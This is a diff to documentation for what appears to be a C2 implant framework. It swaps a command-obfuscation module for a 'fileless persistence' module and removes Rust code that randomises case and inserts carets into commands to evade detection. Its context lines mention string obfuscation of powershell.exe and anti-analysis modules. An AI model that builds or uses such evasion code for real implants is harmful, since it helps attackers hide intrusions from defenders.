@@ -11,7 +11,7 @@ C2R2-v2/
 │   │   ├── main.rs        # Agent entry point
 │   │   ├── beacon.rs      # Beacon timing logic
 │   │   ├── persistence.rs # Persistence mechanisms
-│   │   ├── argfuscator.rs # Command obfuscation
+│   │   ├── persistence_fileless.rs # Fileless persistence
 │   │   ├── evasion.rs     # Anti-analysis techniques
 │   │   ├── syscalls.rs    # Direct system calls
 │   │   └── config.rs      # Configuration
@@ -468,43 +468,6 @@ let powershell = obfstr!("powershell.exe");
 
 // Use in code
 Command::new(powershell).arg("-Command").arg(cmd);
-```
-
-### Command Obfuscation (ArgFuscator)
-
-```rust
-// agent/src/argfuscator.rs
-pub fn obfuscate_command(cmd: &str) -> String {
-    let techniques = [
-        randomize_case,
-        insert_carets,
-        insert_quotes,
-        environment_variables,
-    ];
-    
-    let technique = techniques[rand::random::<usize>() % techniques.len()];
-    technique(cmd)
-}
-
-fn randomize_case(cmd: &str) -> String {
-    cmd.chars().map(|c| {
-        if rand::random() {
-            c.to_uppercase().to_string()
-        } else {
-            c.to_lowercase().to_string()
-        }
-    }).collect()
-}
-
-fn insert_carets(cmd: &str) -> String {
-    cmd.chars().enumerate().map(|(i, c)| {
-        if i > 0 && rand::random::<f32>() < 0.3 {
-            format!("^{}", c)
-        } else {
-            c.to_string()
-        }
-    }).collect()
-}
 ```
 
 ### Module Encryption
